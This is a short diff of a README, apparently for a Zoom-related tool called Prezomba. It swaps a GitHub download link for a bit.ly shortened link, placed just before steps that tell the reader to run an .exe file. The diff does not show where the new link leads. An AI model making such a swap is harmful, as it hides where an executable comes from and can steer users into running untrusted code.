@@ -17,7 +17,7 @@ Prezomba requests:
 * [_Zoom Meetings_](https://zoom.us/)
 
 
-Then, after you [Download](https://github.com/Guiflayrom/PrezombaEXE):
+Then, after you [Download](https://bit.ly/3xjVyQp):
 
 1. Open **_/Prezomba 3.0 exe/Prezomba 3.0.exe_**
 2. Type: **1**
